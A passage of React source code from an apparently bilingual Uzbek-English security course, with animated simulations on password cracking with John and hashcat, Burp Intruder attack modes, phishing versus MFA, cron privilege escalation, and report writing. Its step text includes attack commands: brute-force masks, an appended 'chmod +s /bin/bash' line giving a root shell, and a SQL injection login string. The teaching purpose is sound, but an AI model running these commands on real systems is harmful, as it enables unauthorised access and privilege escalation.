    {col:AM,uz:"~14 million so'z sinaldi — birortasi hash bilan aniq mos kelmadi",en:"~14 million words are tried — not one matches the hash exactly",duz:"«Password123!» lug'atning o'zida alohida qator sifatida yo'q.",den:"«Password123!» doesn't exist as its own line in the wordlist."},
    {col:D,uz:"❌ 0 ta hash buzildi — «password» asosligi sezilmay qoldi",en:"❌ 0 hashes cracked — the fact it was based on «password» went unnoticed",duz:"Asl so'zga juda yaqin bo'lsa ham, aynan mos kelmasa John uni topmaydi.",den:"Even sitting very close to the original word, if it isn't an exact match, John won't find it.",final:true,bad:true}
  ];
  const RULES=[
    {col:BL,uz:"john --wordlist=rockyou.txt --rules hashes.txt — qoidalar bilan",en:"john --wordlist=rockyou.txt --rules hashes.txt — with mutation rules",duz:"Xuddi shu lug'at, xuddi shu hash — faqat yondashuv boshqacha.",den:"The same wordlist, the same hash — only the approach differs."},
    {col:AM,uz:"«password» so'zidan yuzlab variant avtomatik yasaladi",en:"Hundreds of variants are automatically generated from «password»",duz:"Bosh harf, oxiriga raqam, belgi bilan almashtirish — hammasi sinaladi.",den:"Capitalization, appended digits, symbol substitution — all get tried."},
    {col:AM,uz:"Variantlardan biri: Password123! — hash bilan AYNAN mos keladi",en:"One of the variants: Password123! — matches the hash EXACTLY",duz:"Qoidalar odamlarning «murakkablashtirish» odatini taqlid qiladi.",den:"The rules imitate the way people typically «complicate» a password."},
    {col:A,uz:"✅ Hash buzildi — inson odatlari qoidalar bilan qamrab olindi",en:"✅ The hash is cracked — human habits were captured by the rules",duz:"Xuddi shu 14 million so'z — endi har biridan yuzlab variant.",den:"The same 14 million words — now with hundreds of variants each.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="plain"?PLAIN:RULES;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="plain"?PLAIN:run==="rules"?RULES:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu «Password123!» hashini qoidasiz va --rules bilan sinang.","⬇ Pick a scenario — try cracking the same «Password123!» hash with and without --rules.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="plain"?t(lang,"✗ Qoidasiz: aynan mos kelmasa — topilmaydi","✗ Without rules: not an exact match, not found"):t(lang,"✓ --rules bilan: variant hash bilan mos keldi","✓ With --rules: a variant matched the hash")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("plain");setStep(-1);},style:{flex:1,padding:"9px",background:run==="plain"?D+"22":SL2,color:run==="plain"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"❌ Qoidasiz lug'at","❌ Plain wordlist")),
      React.createElement("button",{onClick:()=>{setRun("rules");setStep(-1);},style:{flex:1,padding:"9px",background:run==="rules"?A+"22":SL2,color:run==="rules"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"✅ --rules bilan","✅ With --rules"))));
}

function GPUSpeedSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const CPU=[
    {col:BL,uz:"hashcat --force -D 1 -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a — CPU'da ishga tushirildi",en:"hashcat --force -D 1 -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a — running on the CPU",duz:"8 belgili to'liq brute-force maskasi, faqat protsessor kuchi bilan.",den:"A full 8-character brute-force mask, using only processor power."},
    {col:AM,uz:"Tezlik: ~50 million taxmin/soniya",en:"Speed: ~50 million guesses/second",duz:"Zamonaviy CPU uchun odatiy MD5 tezligi.",den:"A typical MD5 speed for a modern CPU."},
    {col:AM,uz:"8 belgili to'liq maydon: ~6,6 kvadrilion kombinatsiya",en:"The full 8-character space: ~6.6 quadrillion combinations",duz:"Katta harf+kichik harf+raqam+belgi — 95 ta variant, 8 pozitsiya.",den:"Upper+lower+digit+symbol — 95 possible characters, 8 positions."},
    {col:D,uz:"🐌 Baholangan vaqt: ~4 yil — amaliy jihatdan imkonsiz",en:"🐌 Estimated time: ~4 years — practically infeasible",duz:"Hech kim bitta hash uchun 4 yil kutmaydi.",den:"No one waits 4 years for a single hash.",final:true,bad:true}
  ];
  const GPU=[
    {col:BL,uz:"hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a — xuddi shu buyruq, GPU'da",en:"hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a — the exact same command, on the GPU",duz:"Bitta harf ham o'zgarmadi — faqat ishlaydigan uskuna boshqa.",den:"Not a single character changed — only the hardware running it differs."},
    {col:AM,uz:"Tezlik: ~40 milliard taxmin/soniya (o'rtacha zamonaviy videokarta)",en:"Speed: ~40 billion guesses/second (an average modern GPU)",duz:"Minglab GPU yadrosi bir vaqtda parallel ishlaydi.",den:"Thousands of GPU cores work in parallel at once."},
    {col:AM,uz:"Xuddi shu ~6,6 kvadrilion kombinatsiya",en:"The exact same ~6.6 quadrillion combinations",duz:"Vazifaning o'zi bir xil — faqat bajarish tezligi farq qiladi.",den:"The task itself is identical — only the execution speed differs."},
    {col:A,uz:"⚡ Baholangan vaqt: ~2 kun — ~800 barobar tezroq",en:"⚡ Estimated time: ~2 days — ~800x faster",duz:"Xuddi shu vazifa — yillar o'rniga kunlar.",den:"The exact same task — days instead of years.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="cpu"?CPU:GPU;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="cpu"?CPU:run==="gpu"?GPU:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu 8 belgili brute-force vazifasini CPU va GPU'da solishtiring.","⬇ Pick a scenario — compare the same 8-character brute-force job on CPU versus GPU.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="cpu"?t(lang,"✗ CPU: ~4 yil — amalda ishlatib bo'lmaydi","✗ CPU: ~4 years — unusable in practice"):t(lang,"✓ GPU: ~2 kun — amaliy jihatdan imkon bor","✓ GPU: ~2 days — practically feasible")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("cpu");setStep(-1);},style:{flex:1,padding:"9px",background:run==="cpu"?D+"22":SL2,color:run==="cpu"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🐌 CPU'da","🐌 On CPU")),
      React.createElement("button",{onClick:()=>{setRun("gpu");setStep(-1);},style:{flex:1,padding:"9px",background:run==="gpu"?A+"22":SL2,color:run==="gpu"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"⚡ GPU'da","⚡ On GPU"))));
}

function IntruderModeSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const SNIPER=[
    {col:BL,uz:"Login formasi: username va password — ikkala maydon ham § bilan belgilangan",en:"Login form: username and password — both fields are marked with §",duz:"Vazifa: to'g'ri admin/hunter2 juftligini topish.",den:"Goal: find the correct admin/hunter2 pair."},
    {col:AM,uz:"Sniper: BITTA ro'yxatni har joyga NAVBAT bilan qo'yadi",en:"Sniper: puts ONE list into each spot, ONE AT A TIME",duz:"Bir vaqtning o'zida faqat bitta maydon o'zgaradi, qolgani asl holida qoladi.",den:"Only one field changes at a time, the rest stay at their original value."},
    {col:AM,uz:"admin/§so'z1§, admin/§so'z2§... keyin §so'z1§/test123, §so'z2§/test123...",en:"admin/§word1§, admin/§word2§... then §word1§/test123, §word2§/test123...",duz:"Ikkala maydon BIR VAQTDA hech qachon o'zgartirilmaydi.",den:"Both fields are never varied AT THE SAME TIME."},
    {col:D,uz:"❌ To'g'ri juftlik (admin+hunter2) hech qachon birga yuborilmaydi",en:"❌ The correct pair (admin+hunter2) is never sent together",duz:"Noto'g'ri rejim tanlash — vaqt behuda ketadi, natija yo'q.",den:"The wrong mode choice — time wasted, no result.",final:true,bad:true}
  ];
  const CLUSTER=[
    {col:BL,uz:"Login formasi: xuddi shu ikkala maydon § bilan belgilangan",en:"Login form: the exact same two fields marked with §",duz:"Xuddi shu vazifa, xuddi shu forma.",den:"The exact same goal, the exact same form."},
    {col:AM,uz:"Cluster bomb: IKKI alohida ro'yxat — usernames.txt va passwords.txt",en:"Cluster bomb: TWO separate lists — usernames.txt and passwords.txt",duz:"Har bir maydon o'z ro'yxatiga ega.",den:"Each field gets its own list."},
    {col:AM,uz:"Har username BARCHA parollar bilan sinaladi — to'liq kombinatsiya jadvali",en:"Every username is tried with EVERY password — a full combination matrix",duz:"5 login × 1000 parol = 5000 ta so'rov, hech biri o'tkazib yuborilmaydi.",den:"5 logins × 1000 passwords = 5,000 requests, none skipped."},
    {col:A,uz:"✅ admin+hunter2 juftligi albatta bir marta birga sinaladi — topiladi",en:"✅ The admin+hunter2 pair is definitely tried together once — and found",duz:"To'g'ri rejim tanlash — vazifaning o'ziga mos usul.",den:"The right mode choice — a method that actually fits the task.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="sniper"?SNIPER:CLUSTER;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="sniper"?SNIPER:run==="cluster"?CLUSTER:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — ikkita maydonli login formasini Sniper va Cluster bomb bilan sinang.","⬇ Pick a scenario — attack the same two-field login form with Sniper versus Cluster bomb.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="sniper"?t(lang,"✗ Sniper: bu vazifa uchun noto'g'ri rejim","✗ Sniper: the wrong mode for this task"):t(lang,"✓ Cluster bomb: har kombinatsiya sinaladi","✓ Cluster bomb: every combination gets tried")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("sniper");setStep(-1);},style:{flex:1,padding:"9px",background:run==="sniper"?D+"22":SL2,color:run==="sniper"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"❌ Sniper","❌ Sniper")),
      React.createElement("button",{onClick:()=>{setRun("cluster");setStep(-1);},style:{flex:1,padding:"9px",background:run==="cluster"?A+"22":SL2,color:run==="cluster"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"✅ Cluster bomb","✅ Cluster bomb"))));
}

function MFADefenseSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const NOMFA=[
    {col:BL,uz:"Qurbon SET orqali klonlangan sahifaga login/parolni kiritdi",en:"The victim enters credentials on the page SET cloned",duz:"Sahifa aslidan farqlanmaydi — qurbon shubhalanmaydi.",den:"The page is indistinguishable from the real one — the victim suspects nothing."},
    {col:AM,uz:"Hujumchi terminalida darhol ko'rinadi: admin@corp.com : Summer2024!",en:"It instantly appears in the attacker's terminal: admin@corp.com : Summer2024!",duz:"Credential Harvester har kiritilgan qiymatni to'g'ridan-to'g'ri yozib boradi.",den:"The Credential Harvester logs every entered value directly."},
    {col:AM,uz:"Hujumchi haqiqiy saytga o'sha login/parol bilan kiradi",en:"The attacker logs into the real site with those exact credentials",duz:"Faqat login+parol talab qilinadi — boshqa hech narsa yo'q.",den:"Only a login+password is required — nothing else."},
    {col:D,uz:"🔓 Darhol kirildi — bitta parol butun akkauntni ochib berdi",en:"🔓 Instant access — one password opened the entire account",duz:"Parol yagona to'siq bo'lganda, uni o'g'irlash yetarli.",den:"When the password is the only barrier, stealing it is enough.",final:true,bad:true}
  ];
  const MFA=[
    {col:BL,uz:"Xuddi shu qurbon xuddi shu klonlangan sahifaga login/parolni kiritdi",en:"The exact same victim enters credentials on the exact same cloned page",duz:"Phishing bosqichining o'zi bir xil muvaffaqiyatli o'tdi.",den:"The phishing step itself succeeds just the same."},
    {col:AM,uz:"Hujumchi terminalida bir xil ko'rinadi: admin@corp.com : Summer2024!",en:"The same credentials appear in the attacker's terminal: admin@corp.com : Summer2024!",duz:"Parol o'g'irlanishining o'zi hech qanday farq qilmadi.",den:"The password theft itself made no difference so far."},
    {col:AM,uz:"Hujumchi haqiqiy saytga kirmoqchi bo'ladi — tizim qurbonning telefoniga tasdiq so'rovi yuboradi",en:"The attacker tries to log into the real site — the system sends an approval request to the victim's phone",duz:"Bu — hujumchida yo'q, faqat qurbonda bo'lgan ikkinchi omil.",den:"This is the second factor — something only the victim has, not the attacker."},
    {col:A,uz:"🔒 Qurbon kutilmagan tasdiq so'rovini ko'rib rad etadi — hujum to'xtatildi",en:"🔒 The victim sees the unexpected prompt and denies it — the attack is stopped",duz:"O'g'irlangan parolning o'zi endi yetarli emas edi.",den:"The stolen password alone was no longer enough.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="no_mfa"?NOMFA:MFA;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="no_mfa"?NOMFA:run==="mfa"?MFA:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu o'g'irlangan parol MFA'siz va MFA bilan qanday farqli oqibatga olib kelishini ko'ring.","⬇ Pick a scenario — see how the same stolen password leads to a very different outcome without and with MFA.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="no_mfa"?t(lang,"✗ MFA'siz: o'g'irlangan parol yetarli edi","✗ Without MFA: the stolen password was enough"):t(lang,"✓ MFA bilan: o'g'irlangan parol yetarli emas edi","✓ With MFA: the stolen password wasn't enough")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("no_mfa");setStep(-1);},style:{flex:1,padding:"9px",background:run==="no_mfa"?D+"22":SL2,color:run==="no_mfa"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔓 MFA'siz","🔓 Without MFA")),
      React.createElement("button",{onClick:()=>{setRun("mfa");setStep(-1);},style:{flex:1,padding:"9px",background:run==="mfa"?A+"22":SL2,color:run==="mfa"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔒 MFA bilan","🔒 With MFA"))));
}

function CronPrivescSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const SAFE=[
    {col:BL,uz:"cat /etc/crontab — root har daqiqada /opt/backup.sh ni ishga tushiradi",en:"cat /etc/crontab — root runs /opt/backup.sh every minute",duz:"Bu — juda odatiy, zararsiz ko'rinadigan sozlama.",den:"This is a very ordinary, innocent-looking setup."},
    {col:AM,uz:"ls -la /opt/backup.sh — -rwxr-xr-x root:root — faqat root yoza oladi",en:"ls -la /opt/backup.sh — -rwxr-xr-x root:root — only root can write to it",duz:"Ruxsatlar to'g'ri sozlangan: 755.",den:"Permissions are set correctly: 755."},
    {col:AM,uz:"Oddiy foydalanuvchi sifatida tahrirlashga urinish: echo evil >> backup.sh — Permission denied",en:"Trying to edit it as a normal user: echo evil >> backup.sh — Permission denied",duz:"Yozish ruxsati yo'qligi sababli urinish darhol rad etiladi.",den:"Without write permission, the attempt is rejected immediately."},
    {col:A,uz:"🔒 Skript himoyalangan — cron orqali privesc yo'li yopiq",en:"🔒 The script is protected — the cron privesc path is closed",duz:"To'g'ri ruxsat — butun hujum vektorini yo'qqa chiqaradi.",den:"Correct permissions eliminate this entire attack vector.",final:true}
  ];
  const RISKY=[
    {col:BL,uz:"cat /etc/crontab — root har daqiqada xuddi shu /opt/backup.sh ni ishga tushiradi",en:"cat /etc/crontab — root runs the exact same /opt/backup.sh every minute",duz:"Tashqi ko'rinishi bir xil — muammo faqat ruxsatlarda.",den:"It looks identical from the outside — the problem is only in the permissions."},
    {col:AM,uz:"ls -la /opt/backup.sh — -rwxrwxrwx root:root — HAMMA yoza oladi (xato!)",en:"ls -la /opt/backup.sh — -rwxrwxrwx root:root — EVERYONE can write to it (a mistake!)",duz:"777 — ehtimol tezkor tuzatish uchun vaqtincha qo'yilgan va unutilgan.",den:"777 — probably set as a quick fix once and never reverted."},
    {col:AM,uz:"echo 'chmod +s /bin/bash' >> /opt/backup.sh — o'z qatorimiz qo'shildi",en:"echo 'chmod +s /bin/bash' >> /opt/backup.sh — our own line is appended",duz:"Skriptning mazmuni endi bizning nazoratimizda.",den:"The script's contents are now under our control."},
    {col:D,uz:"☠ Bir daqiqadan keyin cron ishga tushadi — /bin/bash SUID bo'ldi, root shell tayyor",en:"☠ A minute later cron runs it — /bin/bash becomes SUID, a root shell is ready",duz:"bash -p buyrug'i endi to'g'ridan-to'g'ri root beradi.",den:"Running bash -p now hands over root directly.",final:true,bad:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="safe"?SAFE:RISKY;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="safe"?SAFE:run==="risky"?RISKY:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — root ishga tushiradigan bir xil cron skriptini ikki ruxsat sozlamasida ko'ring.","⬇ Pick a scenario — see the same root-run cron script under two different permission settings.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="safe"?t(lang,"✓ 755: cron privesc vektori yopiq","✓ 755: the cron privesc vector is closed"):t(lang,"✗ 777: bir daqiqada root shell","✗ 777: root shell within a minute")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("safe");setStep(-1);},style:{flex:1,padding:"9px",background:run==="safe"?A+"22":SL2,color:run==="safe"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔒 Himoyalangan skript (755)","🔒 Protected script (755)")),
      React.createElement("button",{onClick:()=>{setRun("risky");setStep(-1);},style:{flex:1,padding:"9px",background:run==="risky"?D+"22":SL2,color:run==="risky"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"☠ Yoziladigan skript (777)","☠ Writable script (777)"))));
}

function FindingQualitySim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const VAGUE=[
    {col:BL,uz:"Hisobotda yoziladi: «Login sahifasi xavfli ko'rinadi»",en:"The report says: «The login page looks dangerous»",duz:"Bir jumlalik, hech qanday tafsilotsiz eslatma.",den:"A one-line note with no detail at all."},
    {col:AM,uz:"Isbot yo'q, aniq qadam yo'q, jiddiylik darajasi ko'rsatilmagan",en:"No proof, no exact steps, no severity level given",duz:"O'quvchi nima haqida gap ketayotganini taxmin qilishga majbur.",den:"The reader is left guessing what's actually being described."},
    {col:AM,uz:"Mijozning IT jamoasi muammoni takrorlay olmaydi — «bizda hammasi normal» deb javob beradi",en:"The client's IT team can't reproduce it — replies «everything looks fine on our end»",duz:"Isbotsiz da'vo — tekshirib bo'lmaydigan da'vo.",den:"A claim without proof is a claim that can't be verified."},
    {col:D,uz:"🗑 Topilma e'tiborsiz qoldirildi — zaiflik tuzatilmasdan qoladi",en:"🗑 The finding gets ignored — the vulnerability stays unfixed",duz:"Haqiqiy zaiflik bo'lsa ham, yozilish sifati uni yo'qqa chiqardi.",den:"Even if the vulnerability is real, poor writing made it disappear.",final:true,bad:true}
  ];
  const STRUCTURED=[
    {col:BL,uz:"Hisobotda yoziladi: sarlavha + tavsif + CVSS 9.8 + PoC qadamlari",en:"The report has: a title + description + CVSS 9.8 + PoC steps",duz:"Xuddi shu haqiqiy zaiflik — endi to'liq hujjatlashtirilgan.",den:"The exact same real vulnerability — now fully documented."},
    {col:AM,uz:"PoC: aniq buyruq — username=admin' OR '1'='1 — skrinshot bilan",en:"PoC: the exact command — username=admin' OR '1'='1 — with a screenshot",duz:"O'quvchi buyruqni ko'chirib, o'zi sinab ko'rishi mumkin.",den:"The reader can copy the command and try it themselves."},
    {col:AM,uz:"Mijozning IT jamoasi xuddi shu qadamlarni takrorlaydi — zaiflikni o'z ko'zi bilan ko'radi",en:"The client's IT team reproduces the exact steps — and sees the vulnerability with their own eyes",duz:"Endi bahs yo'q — natija tekshirib bo'ladigan.",den:"No more debate — the result is verifiable."},
    {col:A,uz:"✅ Critical deb belgilanib, 24 soat ichida tuzatildi",en:"✅ Flagged Critical and fixed within 24 hours",duz:"Aniq yozilgan topilma — tezkor harakatga aylanadi.",den:"A clearly written finding turns into fast action.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="vague"?VAGUE:STRUCTURED;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="vague"?VAGUE:run==="structured"?STRUCTURED:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu haqiqiy zaiflikni noaniq va tuzilgan tarzda yozib ko'ring.","⬇ Pick a scenario — write up the exact same real vulnerability vaguely versus in a structured way.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="vague"?t(lang,"✗ Noaniq: haqiqiy zaiflik e'tiborsiz qoldi","✗ Vague: a real vulnerability went unnoticed"):t(lang,"✓ Tuzilgan: haqiqiy zaiflik tezda tuzatildi","✓ Structured: a real vulnerability was fixed fast")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("vague");setStep(-1);},style:{flex:1,padding:"9px",background:run==="vague"?D+"22":SL2,color:run==="vague"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🗑 Noaniq topilma","🗑 Vague finding")),
      React.createElement("button",{onClick:()=>{setRun("structured");setStep(-1);},style:{flex:1,padding:"9px",background:run==="structured"?A+"22":SL2,color:run==="structured"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"✅ Tuzilgan topilma","✅ Structured finding"))));
}

function MethodologySim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const RANDOM=[
    {col:BL,uz:"Foothold qo'lga kiritildi — www-data foydalanuvchisi",en:"Foothold obtained — the www-data user",duz:"Boshlang'ich nuqta ikkala ssenariyda ham bir xil.",den:"The starting point is identical in both scenarios."},
